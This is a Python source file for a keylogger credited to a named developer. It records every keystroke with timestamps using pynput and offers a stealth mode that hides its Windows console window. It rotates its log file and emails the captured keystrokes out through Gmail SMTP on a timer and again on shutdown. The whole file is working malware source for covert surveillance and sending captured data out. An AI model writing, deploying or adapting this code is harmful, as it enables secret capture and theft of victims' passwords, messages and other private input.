from pynput import keyboard
import argparse
import os
import smtplib
import platform
import time
from datetime import datetime
from threading import Timer

# Pre-configured email settings
PRESET_RECIPIENT_EMAIL = "recipient@example.com"
PRESET_SENDER_EMAIL = "sender@example.com"
PRESET_SENDER_PASSWORD = "yourpassword"

def show_banner():
    print(r"""
 _  __          _                                      
| |/ /___ _   _| | ___  ___ ___  _ __   ___ _ __  _   _ 
| ' // _ \ | | | |/ _ \/ __/ _ \| '_ \ / _ \ '_ \| | | |
| . \  __/ |_| | |  __/ (_| (_) | | | |  __/ | | | |_| |
|_|\_\___|\__,_|_|\___|\___\___/|_| |_|\___|_| |_|\__,_|
=================================================================
    Simple Keylogger – Developed by: Ayush Thakur (Hunter001x)
            GitHub: https://github.com/aayushthakur001
=================================================================
    """)

excluded_keys = ["Key.shift", "Key.ctrl", "Key.alt", "Key.cmd"]  # Feature 9: Exclude specific keys
log_file = "key_log.txt"
log_rotation_size = 1024 * 1024  # 1 MB for log rotation (Feature 8)

def send_email(log_file, recipient_email, sender_email, sender_password):
    try:
        with open(log_file, "r") as f:
            log_content = f.read()
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, recipient_email, log_content)
        server.quit()
        print("📧 Log file sent via email.")
    except Exception as e:
        print(f"❌ Failed to send email: {e}")

def rotate_log_file():
    if os.path.exists(log_file) and os.path.getsize(log_file) >= log_rotation_size:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        os.rename(log_file, f"{log_file}_{timestamp}")
        print(f"🔄 Log file rotated: {log_file}_{timestamp}")

def on_press(key):
    try:
        if str(key) in excluded_keys:
            return  # Skip excluded keys
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Feature 5: Add timestamps
        with open(log_file, "a") as f:
            f.write(f"{timestamp} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{timestamp} - [{key}]\n")
    except Exception as e:  # Feature 6: Error handling
        print(f"❌ Error writing to log file: {e}")

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def stop_keylogger():
    print("🛑 Keylogger stopped.")
    # Send email after 3 seconds
    Timer(3.0, send_email, [log_file, PRESET_RECIPIENT_EMAIL, PRESET_SENDER_EMAIL, PRESET_SENDER_PASSWORD]).start()
    os._exit(0)

def main():
    show_banner()
    
    parser = argparse.ArgumentParser(description="Simple Keylogger by Ayush Thakur (Hunter001x)")
    parser.add_argument('--output', default="key_log.txt", help="Output file to save keystrokes (default: key_log.txt)")
    parser.add_argument('--email', help="Recipient email to send logs")
    parser.add_argument('--sender_email', help="Sender email for sending logs")
    parser.add_argument('--sender_password', help="Sender email password")
    parser.add_argument('--hotkey', default="<esc>", help="Hotkey to stop the keylogger (default: <esc>)")
    parser.add_argument('--stealth', action='store_true', help="Run in stealth mode (no console output)")
    args = parser.parse_args()

    global log_file
    log_file = args.output

    if args.stealth:  # Feature 3: Stealth mode
        if platform.system() == "Windows":
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        else:
            print("⚠️ Stealth mode is only supported on Windows.")

    print(f"🛡️ Logging keystrokes to: {log_file}...")
    
    if args.email and args.sender_email and args.sender_password:  # Feature 2: Email notifications
        Timer(60.0, send_email, [log_file, args.email, args.sender_email, args.sender_password]).start()

    rotate_log_file()  # Feature 8: Log rotation

    with keyboard.GlobalHotKeys({args.hotkey: stop_keylogger}):  # Feature 4: Customizable hotkey
        start_keylogger()

if __name__ == "__main__":
    main()
